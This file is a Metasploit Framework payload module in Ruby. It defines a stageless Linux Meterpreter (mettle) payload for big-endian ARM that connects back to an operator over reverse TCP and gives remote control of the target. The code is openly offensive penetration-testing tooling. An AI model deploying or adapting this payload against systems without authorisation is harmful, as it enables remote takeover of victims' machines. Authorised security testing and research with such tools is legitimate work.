##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/meterpreter_options'
require 'msf/base/sessions/mettle_config'
require 'msf/base/sessions/meterpreter_armbe_linux'

module MetasploitModule

  CachedSize = 639520

  include Msf::Payload::Single
  include Msf::Sessions::MeterpreterOptions
  include Msf::Sessions::MettleConfig

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'          => 'Linux Meterpreter',
        'Description'   => 'Run the mettle server payload (stageless)',
        'Author'        => [
          'Adam Cammack <adam_cammack[at]rapid7.com>'
        ],
        'Platform'      => 'linux',
        'Arch'          => ARCH_ARMBE,
        'License'       => MSF_LICENSE,
        'Handler'       => Msf::Handler::ReverseTcp,
        'Session'       => Msf::Sessions::Meterpreter_armbe_Linux
      )
    )
  end

  def generate
    MetasploitPayloads::Mettle.new('armv5b-linux-musleabi', generate_config).to_binary :exec
  end
end
